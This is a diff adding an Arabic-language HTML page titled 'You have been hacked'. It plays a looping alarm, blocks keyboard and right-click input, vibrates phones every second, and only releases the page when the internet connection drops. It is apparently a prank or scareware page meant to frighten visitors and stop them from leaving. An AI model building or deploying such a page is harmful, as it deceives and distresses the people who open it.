@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>تم اختراقك⚠️</title>
+<style>
+  body {
+    margin: 0;
+    height: 100vh;
+    background: repeating-linear-gradient(
+      45deg,
+      #0f0,
+      #0f0 10px,
+      #060 10px,
+      #060 20px
+    );
+    color: #00ff00;
+    font-family: Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    user-select: none;
+    overflow: hidden;
+  }
+  h1 {
+    font-size: 4em;
+    text-shadow: 0 0 10px #0f0;
+    margin: 0;
+    animation: glitch 2s infinite;
+  }
+  @keyframes glitch {
+    0% {
+      clip-path: polygon(0 2%, 100% 2%, 100% 5%, 0 5%);
+      transform: translate(2px, -2px);
+    }
+    20% {
+      clip-path: polygon(0 15%, 100% 15%, 100% 18%, 0 18%);
+      transform: translate(-2px, 2px);
+    }
+    40% {
+      clip-path: polygon(0 35%, 100% 35%, 100% 38%, 0 38%);
+      transform: translate(2px, 0);
+    }
+    60% {
+      clip-path: polygon(0 55%, 100% 55%, 100% 58%, 0 58%);
+      transform: translate(-2px, 0);
+    }
+    80% {
+      clip-path: polygon(0 75%, 100% 75%, 100% 78%, 0 78%);
+      transform: translate(0, 2px);
+    }
+    100% {
+      clip-path: polygon(0 2%, 100% 2%, 100% 5%, 0 5%);
+      transform: translate(2px, -2px);
+    }
+  }
+</style>
+</head>
+<body>
+<h1>تم اختراقك⚠️</h1>
+
+<audio id="alarm" autoplay loop>
+  <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg" />
+  <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.mp3" type="audio/mpeg" />
+</audio>
+
+<script>
+  // منع محاولة الخروج بالضغط على المفاتيح
+  window.addEventListener("keydown", function(e) {
+    e.preventDefault();
+  });
+
+  // منع النقر بزر الفأرة الأيمن
+  window.addEventListener("contextmenu", function(e) {
+    e.preventDefault();
+  });
+
+  // اهتزاز الهاتف كل ثانية مع تشغيل الصوت (إذا مدعوم)
+  function vibrate() {
+    if (navigator.vibrate) {
+      navigator.vibrate(500); // اهتزاز لمدة 500 ملي ثانية
+    }
+  }
+
+  // استدعاء الاهتزاز كل ثانية (متزامن مع الصوت)
+  setInterval(vibrate, 1000);
+
+  // السماح بالخروج فقط عند انقطاع الإنترنت
+  function checkConnection() {
+    if (!navigator.onLine) {
+      window.location.href = "about:blank";
+    }
+  }
+  setInterval(checkConnection, 1000);
+</script>
+</body>
+</html>
